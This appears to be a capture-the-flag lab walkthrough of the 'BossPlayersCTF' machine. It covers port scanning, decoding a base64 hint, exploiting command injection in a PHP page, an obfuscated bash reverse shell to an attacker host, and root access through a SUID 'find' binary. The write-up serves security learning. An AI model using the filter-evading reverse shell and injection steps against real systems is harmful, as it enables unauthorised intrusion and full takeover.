# BossPlayersCTF

## Nmap

```
sudo nmap 192.168.152.20 -p- -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 shows the following page.

![](<../../../.gitbook/assets/image (1226).png>)

Viewing the source code of this page reveals text at the end.

```
WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK
```

We can take this string and run it through base64. We need to perform this three times to reveal a plain text string.

```
echo 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d
echo 'ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K' |  base64 -d
echo 'd29ya2luZ2lucHJvZ3Jlc3MucGhwCg==' |  base64 -d
```

![](<../../../.gitbook/assets/image (1227).png>)

Browsing to workingprogress.php:

![/workingprogress.php](<../../../.gitbook/assets/image (1228).png>)

Looking at the comment regarding ping we can take a guess for command injection on the current page. Appending ?cmd=(command) generates results.

![](<../../../.gitbook/assets/image (1229).png>)

To create a reverse shell run the following command in a terminal:

```
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

Then take the base64 output and run it as a command in the web browser.

```
http://192.168.152.20/workinginprogress.php?cmd=echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqRTFNaTg0TUNBd1BpWXhDZz09Cg==|ba%27%27se%27%276%27%274${IFS}-%27%27d|ba%27%27se%27%2764${IFS}-%27%27d|b%27%27a%27%27s%27%27h
```

This will create a reverse shell connection on our `netcat` listener.

![](<../../../.gitbook/assets/image (1230) (1).png>)

I then transferred `linpeas` over from my attacking machine. Shortly after running linpeas finds that the binary 'find' has the SUID bit set.

Checking this against [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) shows we can use this to gain a root shell.

![](<../../../.gitbook/assets/image (1231).png>)

Run the following command to spawn a root shell:

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![](<../../../.gitbook/assets/image (1232).png>)
